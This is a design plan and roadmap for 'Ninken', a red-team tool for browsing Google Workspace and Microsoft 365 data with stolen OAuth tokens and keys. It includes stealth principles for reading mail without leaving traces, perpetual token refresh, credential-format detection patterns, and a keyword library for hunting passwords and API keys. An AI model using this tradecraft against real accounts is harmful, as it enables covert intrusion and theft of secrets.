# Ninken (忍犬) — Design Plan & Roadmap

## Branding

| Element | Value |
|---------|-------|
| **Name** | Ninken (忍犬) |
| **Meaning** | Stealth Hound (Japanese) |
| **Tagline** | "Track. Hunt. Retrieve." |
| **Key feature** | Perpetual access — refresh token auto-renews the access token forever, no re-auth needed |
| **Logo** | Gemini-generated cyber hound (`/public/ninken-logo.png`). SVG wolf badge for compact contexts (`NinkenIcon`). README banner (`/images/ninken-banner.png`) |
| **Typography** | Logo: Geist Sans (variable). Kanji: Noto Sans JP. Brand name bold, tracked tight |
| **Color palette** | Base: soft dark gray (oklch 0.145). Accent: red-600 (#dc2626). No pure black. Red team aesthetic |
| **Icon style** | SVG only. No emojis anywhere. Lucide icons for UI. Custom SVG for logo and branding |
| **Modes** | Full dark/light mode support. Dark mode is the default (stealth aesthetic) |

### Logo Assets
- **Full logo** (`/public/ninken-logo.png`): Cyber hound with "NINKEN 忍犬 TRACK. HUNT. RETRIEVE." Generated with Gemini `gemini-3-pro-image-preview`. Used on landing page (large, with radial gradient mask) and sidebar header (full width when expanded)
- **Badge** (`NinkenIcon` SVG): Geometric wolf silhouette with red eyes (#dc2626). Uses `currentColor` for adaptability. Used in sidebar when collapsed
- **Banner** (`/images/ninken-banner.png`): Wide README header with dog face, title, kanji, tagline. Dark bg with subtle tech grid

### Sidebar Branding
- **Expanded**: Full logo image at top, zero padding, fills sidebar width. Bottom edge dissolves via CSS `mask-image: linear-gradient(to bottom, black 70%, transparent 100%)`
- **Collapsed**: SVG wolf badge with red eyes. Click either to toggle sidebar state

### Color System (OKLCH)
All colors use OKLCH color space. Dark mode is the default.

```
Dark mode (default):
  --background:       oklch(0.145 0 0)   ~#222    Soft dark gray (NOT pure black)
  --sidebar:          oklch(0.145 0 0)   ~#222    Matches background (no visible boundary)
  --card/--popover:   oklch(0.17 0 0)    ~#282828 Elevated surfaces
  --muted/--secondary:oklch(0.20 0 0)    ~#303030 Muted backgrounds
  --accent:           oklch(0.20 0.02 27)~#303030 Hover states (slight red warmth)
  --border/--input:   oklch(0.27 0 0)    ~#3e3e3e Borders, input outlines
  --muted-foreground: oklch(0.55 0 0)    ~#808080 Secondary text
  --foreground:       oklch(0.9 0 0)     ~#e6e6e6 Primary text
  --primary:          oklch(0.577 0.245 27.325) #dc2626 Red accent
```

Landing page uses Tailwind `from-neutral-950 to-neutral-900` gradient (slightly darker than app bg for drama).

### Design Notes
- Red is used SPARINGLY — accents, active states, primary buttons, logo eyes
- NOT a red flood — the base is soft dark gray with red highlights
- No pure black anywhere — `oklch(0.145)` is the darkest surface
- Sidebar and background share the same color — seamless, no boundary
- Logo dissolves into sidebar via CSS mask gradient
- Think: terminal aesthetic, Cobalt Strike, Mythic C2 UI
- Star color: red-500 (not yellow — stays on-brand)

### Design Principles
- **No emojis** — SVG icons only, everywhere
- **Red team aesthetic** — dark gray base, red accents, think Cobalt Strike / Mythic C2
- **Minimal chrome** — content-first, UI stays out of the way
- **No horizontal scroll** — all layouts use `overflow-x-hidden` and `min-w-0`
- **Sharp typography** — Geist Sans, proper hierarchy, no rounded bubbly fonts
- **Subtle animations** — smooth but not playful. Fade, slide, no bounce

### OPSEC & Stealth Principles
Ninken is designed for zero-footprint reconnaissance. Every API interaction should leave the smallest possible trace.

- **Silent reads** — API access does NOT mark messages as read. The Gmail API only removes the `UNREAD` label when explicitly requested via `messages.modify`. Ninken never does this automatically. The target's inbox looks untouched — no bold-to-read transitions, no unread count changes.
- **No write-by-default** — All operations are read-only unless the operator explicitly chooses an action (reply, trash, label, etc.). Browsing is completely passive.
- **Detection surface** — The only trace is in Google Workspace Admin Console audit logs (Reports > User activity > Token grants, API calls). Most orgs don't monitor these closely, but sophisticated SOCs may detect unusual API activity patterns.
- **Token stealth** — Refresh tokens renew silently. No OAuth consent screens, no browser redirects, no re-authentication prompts on the target's end.
- **Future: stealth indicators** — UI should surface OPSEC-relevant context: whether an action is read-only vs. leaves traces, audit log implications of each operation, time-since-last-API-call for rate limiting awareness.

## Overview

**Ninken (忍犬)** is a universal red team data exploration platform. Red teamers paste or upload stolen credentials (OAuth tokens, PATs, API keys) and Ninken renders a full native-quality UI for that service — no need to touch the target's actual web UI.

Currently supports: **Google Workspace** (Gmail + Drive), **Microsoft 365** (Outlook, OneDrive, Teams, Entra ID, M365 Audit)
Roadmap: GitHub, GitLab, Slack, AWS, and more.

## Future Platform Architecture

```
┌─────────────────────────────────────────────────────────────┐
│  Ninken (忍犬) — Universal Red Team Data Explorer            │
│                                                              │
│  ┌─────────────┐                                            │
│  │  Auth Page   │ ← Paste/upload ANY credential type:       │
│  │              │   - Google OAuth token.json                │
│  │  "What do    │   - GitHub PAT                            │
│  │   you have?" │   - GitLab PAT / OAuth token              │
│  │              │   - Slack Bot/User token                   │
│  │              │   - Azure/M365 OAuth token                 │
│  │              │   - AWS access key + secret                │
│  └──────┬───────┘                                           │
│         │ auto-detect credential type                        │
│         ▼                                                    │
│  ┌──────────────────────────────────────────────────────┐   │
│  │  Service Modules (plugins)                            │   │
│  │                                                       │   │
│  │  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌─────────┐ │   │
│  │  │ Google   │ │ GitHub   │ │ GitLab   │ │ Slack   │ │   │
│  │  │ Gmail    │ │ Repos    │ │ Repos    │ │ Channels│ │   │
│  │  │ Drive    │ │ Issues   │ │ Issues   │ │ Messages│ │   │
│  │  │ Buckets  │ │ PRs      │ │ MRs      │ │ Files   │ │   │
│  │  │ Calendar │ │ Actions  │ │ CI/CD    │ │ Users   │ │   │
│  │  │ Contacts │ │ Secrets  │ │ Secrets  │ │         │ │   │
│  │  │          │ │ Orgs     │ │ Groups   │ │         │ │   │
│  │  └──────────┘ └──────────┘ └──────────┘ └─────────┘ │   │
│  │                                                       │   │
│  │  ┌──────────┐ ┌──────────┐ ┌──────────┐             │   │
│  │  │ M365     │ │ AWS      │ │ Custom   │             │   │
│  │  │ Outlook  │ │ S3       │ │ REST API │             │   │
│  │  │ OneDrive │ │ IAM      │ │ (config) │             │   │
│  │  │ Teams    │ │ Lambda   │ │          │             │   │
│  │  │ SharePt  │ │ EC2      │ │          │             │   │
│  │  └──────────┘ └──────────┘ └──────────┘             │   │
│  └──────────────────────────────────────────────────────┘   │
│                                                              │
│  All modules share: profile switcher, local cache,           │
│  export/download, search, dark UI, offline resilience        │
└─────────────────────────────────────────────────────────────┘
```

### Plugin Module System
Each service is a **module** with:
- `credential-type.ts` — defines what credential looks like, validation, auto-detection
- `api/` — Next.js API routes wrapping the service's API
- `components/` — UI components (native-quality clone of the service)
- `hooks/` — React data-fetching hooks
- `icon.tsx` — SVG service icon for sidebar/selector

### Credential Auto-Detection
When a user pastes or uploads a credential, Ninken auto-detects the type:
| Pattern | Service |
|---------|---------|
| `{"refresh_token": ..., "client_id": ...}` | Google Workspace |
| `ghp_*` or `github_pat_*` | GitHub PAT |
| `glpat-*` | GitLab PAT |
| `xoxb-*` or `xoxp-*` | Slack token |
| `eyJ...` (JWT with Microsoft issuer) | Microsoft 365 (OAuth2) |
| `{"refreshToken": ..., "tenantId": ...}` | Microsoft 365 (Refresh Token) |
| `0.AVY...` / `0.AQ8...` (PRT cookie value) | Microsoft 365 (PRT) |
| `AKIA*` + secret | AWS IAM |

### Manual Service Selection Fallback
When auto-detection fails or is ambiguous, Ninken shows a **service selector panel** with:
- Grid of service icons (Google, GitHub, GitLab, Slack, M365, AWS)
- Each card shows: service name, expected credential format, brief description
- User clicks the correct service → credential is validated against that service's schema
- "I'm not sure" option → tries all validators and shows which ones match
- Remembers last selection per credential shape for future uploads

This panel also serves as the entry point for services where credential format overlaps (e.g., generic JWTs that could be M365 or custom OAuth).

### Service Switcher Architecture

The service switcher is the core multi-platform mechanism. It appears in three contexts:

**1. Landing Page — Service Grid**
When no token is loaded, the landing page shows a grid of service cards instead of just a token upload zone:
```
┌─────────────┐  ┌─────────────┐  ┌─────────────┐
│  Google      │  │  Microsoft  │  │  GitHub      │
│  Workspace   │  │  365        │  │              │
│  [SVG icon]  │  │  [SVG icon] │  │  [SVG icon]  │
│  token.json  │  │  OAuth/PRT  │  │  PAT         │
└─────────────┘  └─────────────┘  └─────────────┘
┌─────────────┐  ┌─────────────┐  ┌─────────────┐
│  GitLab      │  │  Slack      │  │  AWS         │
│  [SVG icon]  │  │  [SVG icon] │  │  [SVG icon]  │
│  PAT         │  │  xox token  │  │  Access Key  │
└─────────────┘  └─────────────┘  └─────────────┘
```
- Click a service → shows the credential upload zone scoped to that service
- Or drag-drop any credential → auto-detect triggers, falls back to manual selector
- Each card shows: service name, icon, expected credential format
- Cards for unimplemented services (GitHub, GitLab, Slack, AWS) show "Coming soon" badge, still clickable for roadmap info. Google and Microsoft are live.

**2. Sidebar Header — Active Service Indicator**
When authenticated, the sidebar header (where the Ninken logo is) also shows the active service:
- Small service icon + name next to the logo (e.g., `[G] Google` or `[M365] Microsoft`)
- Clicking it opens a dropdown to switch services or add another credential
- When multiple services are loaded, shows a service list with switch buttons
- The Operate/Audit toggle stays the same — it works across all services

**3. Profile Selector — Multi-Service Profiles**
The existing profile selector expands to show which service each profile belongs to:
- Each profile entry shows: service icon + email/username
- "Add account" option shows the service grid to add credentials for any service
- Switching profiles may also switch the active service

**Route Architecture for Multi-Service**

Option A (flat with service prefix — recommended):
```
/google/gmail          — Google Gmail
/google/drive          — Google Drive
/google/buckets        — GCP Storage
/google/audit          — Google Audit Dashboard
/microsoft/outlook     — M365 Outlook
/microsoft/onedrive    — M365 OneDrive
/microsoft/teams       — M365 Teams
/microsoft/entra       — Entra ID Directory
/microsoft/audit       — M365 Audit Dashboard
/github/repos          — GitHub Repos
/github/audit          — GitHub Audit Dashboard
```

Option B (current flat structure — simpler but doesn't scale):
```
/gmail, /drive, /buckets, /outlook, /onedrive, /repos
```

**Recommendation**: Option A is implemented. Google routes live under the `(google)` route group, Microsoft routes under `(microsoft)`. The service switcher reads the route prefix to determine active service.

**State Management** (implemented):
- Active service derived from URL prefix and provider registry (same pattern as Operate/Audit mode)
- All profiles stored in IndexedDB (`src/lib/token-store.ts`), active profile's credentials set as httpOnly cookie for API routes
- Each service module registers its nav items, audit views, and credential validator via `ServiceProvider` interface (`src/lib/providers/`)
- Shared components (mode toggle, cache indicator, sign out, profile switcher) stay in the common layout
- Service switching: profile dropdown shows provider icon + email, switching profiles navigates to that provider's `defaultRoute`

**Implementation Order**:
1. ~~Restructure routes: rename `(app)` to `(google)`, add route prefix~~ Done
2. ~~Build the landing page service grid~~ Done
3. ~~Add service indicator to sidebar header~~ Done
4. ~~Update profile selector for multi-service~~ Done — profile dropdown shows service icon + email, "Add new service" redirects to `/?add=true`, back button returns to previous service
5. ~~Implement M365 credential handler (OAuth2 refresh token + FOCI public client)~~ Done
6. ~~Build M365 modules (Outlook, OneDrive, Teams, Entra ID, M365 Audit)~~ Done

### Sidebar Updates
When multiple services are loaded, the sidebar shows:
- Service sections (Google, GitHub, GitLab, etc.) with their icons
- Each section expands to show sub-views (Gmail/Drive, Repos/Issues, etc.)
- Profile switcher supports multiple services (shows service icon + account)

### GCP Cloud Storage (Buckets) — v1.0
Same OAuth token already grants access if the user has `cloud-platform` scope (which we request). No additional credentials needed.

**Sidebar:** "Buckets" icon (Database or HardDrive from lucide) under Google section

**UI Views:**
- **Bucket List**: all accessible buckets with name, location, storage class, creation date
- **Object Browser**: navigate bucket contents like a file system (prefix-based folders), breadcrumbs
- **Object Details**: name, size, content-type, metadata, public URL, storage class, timestamps
- **Download**: stream objects directly to browser
- **Upload**: drag-and-drop files into buckets
- **Search**: filter objects by prefix/name within a bucket
- **Permissions**: view bucket IAM policies

**API Routes:**
| Method | Route | Description |
|--------|-------|-------------|
| GET | /api/gcp/buckets | List all buckets |
| GET | /api/gcp/buckets/[name]/objects | List objects (prefix, delimiter, pageToken) |
| GET | /api/gcp/buckets/[name]/objects/download | Download object (query: path) |
| POST | /api/gcp/buckets/[name]/objects | Upload object |
| GET | /api/gcp/buckets/[name]/objects/metadata | Object metadata (query: path) |
| GET | /api/gcp/buckets/[name]/iam | Bucket IAM policy |

**Components:**
```
src/components/buckets/
  bucket-list.tsx        # List all buckets
  object-browser.tsx     # Navigate objects in a bucket (like Drive)
  object-card.tsx        # Object row/card with type icon
  breadcrumbs.tsx        # bucket > prefix > prefix navigation
  upload-dialog.tsx      # Upload to bucket
  object-preview.tsx     # Object details + preview (images, text, JSON)
```

**Key insight for red teamers:** GCP buckets often contain:
- Database backups, config files, secrets
- Terraform state files (contain all infrastructure secrets)
- Application logs with PII
- ML training data
- CI/CD artifacts

### Future Service Roadmap
| Priority | Service | Credential | UI Views |
|----------|---------|------------|----------|
| v1.0 | Google Workspace | OAuth token.json | Gmail, Drive, GCP Buckets (Cloud Storage) |
| **v2.0** | **Microsoft 365** | **FOCI public client OAuth2 refresh token** | **Outlook, OneDrive, Teams, Entra ID, M365 Audit — Implemented** |
| v3.0 | GitHub | PAT (ghp_/github_pat_) | Repos, Issues, PRs, Actions, Secrets, Orgs, Gists |
| v3.0 | GitLab | PAT (glpat-) | Projects, Issues, MRs, CI/CD, Secrets, Groups |
| v4.0 | Slack | Bot/User token (xoxb/xoxp) | Channels, Messages, Files, Users, Search |
| v4.1 | Microsoft 365 — Phase 2 | PRT / session cookies / advanced token flows | SharePoint, PRT exchange, browser cookie SSO, Studio module |
| v5.0 | AWS | Access Key + Secret | S3, IAM, Lambda, EC2, CloudTrail, Secrets Manager |
| v6.0 | Custom REST | URL + token/key | Configurable API explorer |

### Cross-Cutting Features (not tied to a specific service version)

| Feature | Priority | Status | Description |
|---------|----------|--------|-------------|
| **Microsoft 365 Integration** | High | Implemented | Full Microsoft 365 provider with FOCI public client token support (no client_secret). Graph API client (`src/lib/microsoft.ts`: graphFetch, graphJson, graphPaginated, JWT decode, OData sanitization, token cache). ServiceProvider implementation (`src/lib/providers/microsoft.ts`). API routes: Outlook (7), OneDrive (5), Teams (3), Entra ID (5), M365 Audit (1). Hooks: use-outlook, use-onedrive, use-teams, use-entra, use-m365-audit. UI pages: Outlook (3-panel email), OneDrive (file browser), Teams (3-column), Entra ID (tabbed Users/Groups/Roles), M365 Audit (dashboard + 4 sub-pages). Service switching: profile dropdown redirects to provider's defaultRoute, "Add new service" goes to `/?add=true` with back button. Cookie size fix: credentials stripped to essential fields in activate route (Microsoft refresh tokens are ~1500 chars). Panel sizing: pixel strings with unique panel IDs, matching Google pages. |
| **Global Token Refresher** | Medium | Implemented | Background system that auto-refreshes all refreshable tokens at 45min interval. Per-profile toggle via localStorage. Runs across all providers. Files: `src/lib/token-refresher.ts`, `src/hooks/use-token-refresher.ts`. |
| **Token Lifecycle Panel** | Medium | Implemented | Sidebar footer widget showing access token countdown (color-coded), scope count, manual refresh button. API: `/api/auth/token-info`. Files: `src/components/layout/token-lifecycle.tsx`, `src/hooks/use-token-info.ts`. |
| **Per-Service Layouts** | Built-in | Implemented | Google `(google)` and Microsoft `(microsoft)` route groups each have their own `layout.tsx` with service-specific sidebar navigation. Workspace-style layout (sidebar + content) shared across both. |
| **AI Partner** | Low | Planned | AI assistant for data exploration. Anthropic API key stored in `.env`. Defer until after Microsoft + Studio are solid. |
| **Studio Module** | Medium | Planned | Token Intelligence Hub — multi-provider foundation now in place (Google + Microsoft live). Ready for implementation. |
| **Resizable Panels** | Medium | Implemented | `react-resizable-panels` on Gmail (3-panel), Drive (file list + preview), Calendar (sidebar + view), Buckets (sidebar + browser), Outlook (3-panel), Teams (3-column). **CRITICAL: Use pixel strings for sizes (`"200px"`, `"1fr"`), NOT plain numbers. Add unique `id` props to each panel for persistence. Use `className="h-full"` on PanelGroup, NOT `id`.** File: `src/components/ui/resize-handle.tsx`. |
| **Adaptive Empty States** | Medium | Implemented | Gmail: message list expands full-width when no message selected, detail panel appears only when a message is clicked. |
| **Sidebar Slogan** | Low | Implemented | "Track. Hunt. Retrieve." in red below Ninken logo, hidden when collapsed via `group-data-[collapsible=icon]:hidden`. |
| **Alert System** | Medium | Implemented | IndexedDB alert store, bell icon badge with unread count, dropdown panel, full `/alerts` page with filters. Files: `src/lib/alert-store.ts`, `src/hooks/use-alerts.ts`, `src/components/layout/alert-badge.tsx`, `src/components/layout/alert-panel.tsx`, `src/app/alerts/`. |
| **Collection Mode** | High | Planned | Cross-service artifact collection. Third mode alongside Operate/Audit. "Send to Collection" on emails (with attachments), Drive files/folders, bucket objects, etc. Items downloaded in background and stored locally for offline access. Zip download of entire collection or individual items. Survives token revocation and offline. Massive feature — requires local storage engine, background download manager, cross-service item registry. |
| **Global Refresh Button** | Low | Planned | Refresh icon/badge in top-right header that triggers a full content refresh across all visible data (messages, files, events, etc.). |
| **Google Chat** | Medium | Planned | Browse chat history (DMs, spaces, rooms), search through messages, view attachments and threads. Uses Google Chat API (`chat.googleapis.com`). Scopes: `chat.messages.readonly`, `chat.spaces.readonly`. UI: space/room list sidebar, message thread view, search with filters. Route: `/chat`. Nav item under Google Operate. |

### Alert System

A cross-service event notification system. Alerts fire for service events (new email, calendar invite, file shared), system events (token refresh, token expiry warning, scope change), and security events (permission escalation detected, unusual access pattern).

**UI Architecture:**

1. **Alert Badge (Top Right)** — Bell icon in the header bar (next to service indicator + profile avatar). Shows unread count badge. Hovering/clicking opens the alert panel.

2. **Alert Panel (Hover/Click)** — Dropdown panel from the bell icon showing recent alerts grouped by time (Today, Earlier). Each alert shows: source service icon, title, timestamp, brief description. Clickable — navigates to the relevant item (e.g., click a "new email" alert → opens that email in Gmail view). Max ~20 recent alerts in the panel, "View all" link at bottom.

3. **Alert Center (Full View)** — Dedicated `/alerts` route (top-level, not service-specific). Full-page view with filters (by service, by type, by severity, by date range). Searchable. Bulk dismiss. Alert history/log. This lives outside service route groups since it spans all providers.

**Alert Types:**

| Category | Event | Source | Severity |
|----------|-------|--------|----------|
| **Email** | New email received | Gmail / Outlook | Info |
| **Email** | Email matching keyword filter | Gmail / Outlook | Warning |
| **Drive** | File shared with target user | Drive / OneDrive | Info |
| **Drive** | File permission changed | Drive / OneDrive | Warning |
| **Calendar** | New meeting invitation | Calendar | Info |
| **Directory** | New user created | Directory / Entra ID | Warning |
| **Directory** | Admin role assigned | Directory / Entra ID | Critical |
| **Token** | Access token refreshed | System | Info |
| **Token** | Token refresh failed | System | Critical |
| **Token** | Token expiring within 1h | System | Warning |
| **Token** | Scope change detected | System | Warning |
| **Audit** | New OAuth app authorized | Audit | Warning |
| **Audit** | Domain-wide delegation changed | Audit | Critical |

**Implementation:**
- Alert store in IndexedDB (`ninken-alerts` database) — persists across sessions
- Polling-based initially: background interval checks for new items (configurable, default 5min)
- Future: WebSocket/SSE for real-time push when available
- Alert preferences per-profile: which types to show, polling interval, sound/visual toggle
- Provider interface extension: `ServiceProvider.getAlertSources()` returns alert check functions for that provider

**Components:**
```
src/components/layout/alert-badge.tsx      # Bell icon + count badge in header
src/components/layout/alert-panel.tsx      # Hover/click dropdown panel
src/app/(alerts)/alerts/page.tsx           # Full alert center view
src/lib/alert-store.ts                     # IndexedDB alert storage
src/lib/alert-poller.ts                    # Background polling engine
src/hooks/use-alerts.ts                    # React hook for alert state
```

### Token Lifecycle Panel
Display token health and lifetime info in the sidebar or top bar:
- **Access token expiry countdown** — shows time remaining until current access token expires (typically 1 hour)
- **Refresh token status** — green/amber/red indicator: valid, expiring soon, expired
- **Auto-refresh indicator** — shows when the access token was last auto-refreshed
- **Token age** — how long since the refresh token was first issued
- **Scope summary** — quick view of granted scopes with icons
- **Manual refresh button** — force-refresh the access token
- **Revocation warning** — detect when refresh token has been revoked (API returns 401 on refresh attempt)
- **Session duration** — total time this token has been in use this session

Implementation: Add a `/api/auth/token-info` endpoint that returns token metadata (expiry, scopes, age) without exposing the actual tokens. Display as a compact widget near the cache indicator in the sidebar footer.

### Data Export (cross-service)
All modules will support:
- Export data as JSON/CSV
- Download all attachments/files
- Search across all loaded services
- Activity timeline (cross-service chronological view)

### Known Bugs

| Bug | Severity | Status | Description |
|-----|----------|--------|-------------|
| **Sign out button does not work** | High | Fixed | Was only clearing server cookie, not IndexedDB profiles. Fixed by adding `clearAllProfiles()` call in `handleSignOut` in `app-sidebar.tsx`. |
| **Horizontal overflow on responsive views** | Medium | Fixed | Added `overflow-x-hidden` to html element (`globals.css`) and `SidebarInset` (`(google)/layout.tsx`), plus `min-w-0` on content areas. |

## Dual-Mode Architecture: Operate & Audit

Ninken operates in two modes, selectable via a toggle in the top nav:

### Operate Mode (default)
The current mode — impersonates the user and provides native-quality UI for browsing/interacting with their data across Gmail, Drive, Buckets, Calendar, Directory, etc. Equivalent to being logged in as the user.

### Audit Mode
Inspired by [ROADtools](https://github.com/dirkjanm/ROADtools) (Azure AD red team toolkit), but multi-platform starting with Google Workspace. Focuses on enumerating permissions, access levels, group memberships, delegation, and security posture. Collects a full tenant snapshot for offline analysis.

**Why better than ROADtools:** Ninken combines both modes — you can audit a tenant's security posture AND pivot through apps impersonating the user, all in one platform. ROADtools only does enumeration.

#### Graceful Degradation Pattern
Audit APIs always try the highest-privilege path first, then fall back:
1. **Organization scope** (admin) → full tenant enumeration (all users, groups, roles)
2. **User scope** (limited) → current user's own data (own profile, own groups)
3. **No access** → clear message explaining what permissions would unlock more data

The UI shows scope banners:
- Green: "Full organization view"
- Amber: "Limited view — showing your own account only"
- Red: "Cannot access with current permissions"

This pattern applies to ALL services, not just Google. Every audit module should gracefully degrade based on the token's actual privileges.

#### Studio Mode (Cross-Service Persistent Workspace)
A persistent workspace that carries over findings from multiple services. Think of it as an investigation board:

- **Findings panel** — Drag items from any service (emails, files, users, buckets) into Studio
- **Notes/annotations** — Add context to findings ("this user has access to X and Y")
- **Cross-reference view** — See the same identity across services (Google user → GitHub username → Slack handle)
- **Timeline** — Chronological view of actions across all loaded services
- **Export** — Generate a report from Studio contents (PDF, JSON, Markdown)
- **Persistence** — Studio state saved to localStorage/IndexedDB, survives page refreshes
- **Sharing** — Export/import Studio state as a JSON file for team collaboration

Studio is NOT a separate mode — it's an always-available side panel (like Chrome DevTools) that can be toggled from any page in either Operate or Audit mode. It sits alongside the info panel pattern already used in Drive and Buckets.

**Implementation**: Studio launches as a right-side sheet/drawer. Items are added via right-click context menu or drag-drop. State is stored in IndexedDB. Each item tracks: source service, entity type, entity ID, timestamp added, user annotations.

#### Audit Mode — Google Workspace Features

**P0 — Critical (Build First)**

| Feature | Description | API |
|---------|-------------|-----|
| User Enumeration + Properties | All users, org units, status, aliases, recovery info, last login | Admin SDK Directory |
| Group Enumeration + Membership Graph | All groups, members, owners, nested memberships | Admin SDK Directory |
| Admin Role Assignments | Who holds Super Admin, delegated roles, custom roles | Admin SDK Roles |
| 2FA/2SV Status Audit | Per-user 2-Step Verification enrollment and enforcement | Admin SDK Directory (isEnrolledIn2Sv, isEnforcedIn2Sv) |
| OAuth2 Third-Party App Grants | What third-party apps users authorized and what scopes they granted | Token Audit Log / Reports API |

**P1 — High Priority**

| Feature | Description |
|---------|-------------|
| Domain-Wide Delegation Audit | Service accounts with DWD and their granted scopes (Google's highest risk) |
| OU Policy Mapping | Security settings applied at each Organizational Unit level |
| Marketplace Apps | Installed Workspace Marketplace apps and their permissions |
| Device Inventory + Compliance | Endpoint management data, managed vs unmanaged |
| Context-Aware Access Policies | Access levels and their conditions |

**P2 — Important**

| Feature | Description |
|---------|-------------|
| Service Account Key Audit | Key age, unused keys, key rotation status |
| Sharing Settings Audit | External sharing config for Drive, Calendar, etc. |
| Offline Database + Snapshot | SQLite snapshot for offline analysis and sharing |
| Attack Path Graph | D3.js-based interactive graph: users → groups → roles → delegation |
| Export Plugins | Excel, CSV, JSON, BloodHound-compatible |

**P3 — Nice to Have**

| Feature | Description |
|---------|-------------|
| Gmail Delegation Audit | Who has delegated access to whose mailbox |
| Calendar Sharing Audit | External calendar sharing exposure |
| GCP IAM Cross-Reference | Users with GCP roles beyond Workspace |
| Token Manipulation Toolkit | OAuth2 token exchange and abuse |

#### Audit Mode — UI Views

| View | Description |
|------|-------------|
| **Dashboard** | Tenant overview: user/group/device counts, Super Admin count, users without 2FA, apps with DWD. Risk heatmap |
| **Users** | Filterable table: name, email, OU, status, 2FA, last login, admin roles. Filters: "No 2FA", "Super Admin", "Never logged in" |
| **Groups** | All groups with member count, type, external members flag. Expandable members/owners |
| **Admin Roles** | All roles with assigned users. Privilege heatmap |
| **OAuth Apps** | Third-party apps users authorized, scopes, user count, risk rating |
| **Domain-Wide Delegation** | Service accounts with DWD, granted scopes, last usage |
| **Devices** | Managed devices, OS, compliance, encryption. Filter: "Non-compliant", "Stale" |
| **Access Policies** | Context-Aware Access levels and conditions, gap analysis |
| **Attack Paths** | Interactive graph: nodes (users, groups, SAs, apps), edges (membership, ownership, delegation, roles) |
| **Raw Data / Export** | JSON raw view for any object, export to Excel/CSV/JSON |
| **Query** | Cross-service keyword search with pre-built red team query library. Hunt for credentials, secrets, and sensitive data across all accessible services in one shot |

#### Audit Mode — Query (Cross-Service Intelligence Search)

A dedicated search interface in Audit mode that lets the red teamer run keyword queries across one or multiple services simultaneously. Unlike Operate mode search (which searches within a single service), Audit Query is a purpose-built recon tool with pre-built query templates designed for credential harvesting, secret discovery, and sensitive data hunting.

**Why this lives in Audit (not Operate):**
Operate mode search is for browsing — "find my file", "show unread emails". Audit Query is for hunting — "find every password, API key, and secret across this entire tenant". It's an offensive search tool, not a productivity one.

**UI Layout:**

```
┌──────────────────────────────────────────────────────────────────┐
│ Query                                                            │
│ ┌──────────────────────────────────────────────────────────────┐ │
│ │ 🔍  Enter query or select from library...                    │ │
│ └──────────────────────────────────────────────────────────────┘ │
│                                                                  │
│ Services:  [✓] Gmail  [✓] Drive  [ ] Buckets  [ ] Calendar      │
│            [✓] Teams  [✓] OneDrive  [ ] SharePoint               │
│                                                                  │
│ Query Library:  [Credentials] [API Keys] [Infrastructure]        │
│                 [PII] [Financial] [Internal] [Custom]            │
│                                                                  │
│ ┌──────────────────────────────────────────────────────────────┐ │
│ │ Results (147 hits across 3 services)           Export ▼      │ │
│ │                                                              │ │
│ │ ┌─ Gmail (89 hits) ─────────────────────────────────────┐   │ │
│ │ │ ✉ "AWS credentials for staging" — from:devops@...     │   │ │
│ │ │ ✉ "Here's the API key you asked for" — from:lead@...  │   │ │
│ │ │ ...                                                    │   │ │
│ │ └────────────────────────────────────────────────────────┘   │ │
│ │ ┌─ Drive (52 hits) ─────────────────────────────────────┐   │ │
│ │ │ 📄 passwords.xlsx — /Shared/IT/                        │   │ │
│ │ │ 📄 .env.production — /Projects/backend/                │   │ │
│ │ │ ...                                                    │   │ │
│ │ └────────────────────────────────────────────────────────┘   │ │
│ │ ┌─ Teams (6 hits) ──────────────────────────────────────┐   │ │
│ │ │ 💬 "the SSH key is..." — #devops-channel              │   │ │
│ │ │ ...                                                    │   │ │
│ │ └────────────────────────────────────────────────────────┘   │ │
│ └──────────────────────────────────────────────────────────────┘ │
└──────────────────────────────────────────────────────────────────┘
```

**Service targets (multi-platform, searches wherever tokens are loaded):**

| Service | Search API | What It Searches |
|---------|-----------|-----------------|
| **Gmail** | Gmail API `messages.list` with `q=` parameter | Subject, body, sender, attachments filenames |
| **Drive** | Drive API `files.list` with `fullText contains` | File names, file content (Google Docs/Sheets), metadata |
| **GCP Buckets** | Cloud Storage `objects.list` with prefix filter | Object names/paths (no content search — flag objects for download) |
| **Calendar** | Calendar API `events.list` with `q=` parameter | Event titles, descriptions, location, attendee notes |
| **Outlook** | Graph API `/me/messages?$search=` | Subject, body, sender, attachment names |
| **OneDrive** | Graph API `/me/drive/root/search(q='...')` | File names, file content |
| **SharePoint** | Graph API `/sites/{id}/drive/root/search(q='...')` | Site content, document libraries |
| **Teams** | Graph API `/me/chats/messages?$search=` | Chat messages, channel messages |

**Query Library — Pre-built Red Team Queries:**

Organized by category, each query is a saved search pattern with a name, description, the actual query string(s), and recommended services to target.

**Category: Credentials & Passwords**

| Query Name | Search Terms | Target Services | What You Find |
|-----------|-------------|-----------------|---------------|
| Plaintext Passwords | `password`, `passwd`, `pwd`, `contraseña` | Gmail, Drive, Teams, OneDrive | Passwords shared in emails, docs, chats |
| Password Files | `passwords.xlsx`, `passwords.csv`, `passwords.txt`, `creds.txt`, `logins.txt` | Drive, OneDrive, SharePoint, Buckets | Credential spreadsheets and lists |
| Master Password / Vault | `master password`, `vault password`, `keepass`, `1password`, `lastpass`, `bitwarden` | Gmail, Drive, Teams | Password manager master creds, vault exports |
| Default Credentials | `default password`, `default credentials`, `admin/admin`, `root/root` | Gmail, Drive, Teams | Default creds for internal systems |
| WiFi Passwords | `wifi password`, `wireless key`, `WPA`, `network password` | Gmail, Drive, Teams | Office/corporate WiFi credentials |
| Service Account Passwords | `service account`, `svc_`, `sa_password`, `service password` | Gmail, Drive, Teams | Service account credentials |

**Category: API Keys & Secrets**

| Query Name | Search Terms | Target Services | What You Find |
|-----------|-------------|-----------------|---------------|
| AWS Keys | `AKIA`, `aws_access_key`, `aws_secret`, `AWS_ACCESS_KEY_ID` | Gmail, Drive, Buckets, Teams, OneDrive | AWS IAM access keys |
| GCP Keys | `GOCSPX-`, `AIza`, `service_account`, `"type": "service_account"`, `client_secret` | Gmail, Drive, Buckets | GCP API keys, service account key files, OAuth client secrets |
| Azure Keys | `SharedAccessKey`, `AccountKey`, `azure_client_secret`, `AZURE_`, `DefaultEndpointsProtocol` | Gmail, Drive, Teams, OneDrive | Azure storage keys, app secrets, connection strings |
| Generic API Keys | `api_key`, `apikey`, `api-key`, `API_KEY`, `secret_key`, `SECRET_KEY`, `access_token` | All | Generic API keys and tokens |
